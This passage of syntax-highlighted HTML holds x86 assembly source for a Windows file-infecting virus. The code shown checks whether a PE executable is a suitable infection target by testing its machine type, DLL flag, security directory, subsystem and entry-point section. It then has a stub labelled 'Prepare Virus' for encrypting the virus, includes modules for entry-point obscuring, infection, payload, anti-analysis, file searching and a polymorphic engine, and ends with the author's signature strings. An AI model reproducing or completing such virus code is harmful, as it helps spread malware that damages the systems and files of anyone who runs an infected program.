            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> 
        
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">
        
            </span><span class="sc1">; machine type 386+</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.Machine</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> 

            </span><span class="sc1">; is dll ?</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.Characteristics</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> 
        
            </span><span class="sc1">; is 32bit executable image ??</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.Characteristics</span><span class="sc0"> 
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">
                
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; number of sections  </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.number_of_sect</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.SizeOfOptionalHeader</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">sizeof</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">
                
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> 
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> </span><span class="sc1">; contains security directory </span><span class="sc0">
                
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; address of entry point</span><span class="sc0">
        
            </span><span class="sc1">;is win GUI or win CUI ?</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc4">],</span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc4">],</span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_CUI</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_sect_headers</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
        
            </span><span class="sc1">;is first section .text or CODE</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'xet.'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cnt11</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EDOC'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">
        
</span><span class="sc5">cnt11</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;is OEP within first section ?</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; is higher than virt_address</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> </span><span class="sc1">; is lower than code VA</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; add virtual size</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; is within virtual size of code section</span><span class="sc0">
            </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">
        
            </span><span class="sc1">; check for installer</span><span class="sc0">
        
</span><span class="sc5">good_file</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">    
                
</span><span class="sc5">bad_file</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0"> 
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                                       Prepare Virus                                                                   ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Allocate Buffer , Encrypt virus</span><span class="sc0">
</span><span class="sc1">; reserved for later use </span><span class="sc0">
</span><span class="sc5">PrepareVirus</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;pushad</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc1">;mov dword ptr [esp + 1ch],1</span><span class="sc0">
</span><span class="sc5">PrepareOkay</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;popad </span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0"> 
                
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">epo.inc</span><span class="sc0"> 
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">misc.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rand.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">proc.inc</span><span class="sc0"> 
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">apis.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">antis.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">infect.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">payload.inc</span><span class="sc0"> 
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">search_file.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">poly_engine2.inc</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Anunnaki"</span><span class="sc0"> 
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Go ahead (Alex).Make my day"</span><span class="sc0">
</span><span class="sc5">VIRUS_END</span><span class="sc4">:</span><span class="sc0">              
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">START</span></div></body>
</html>
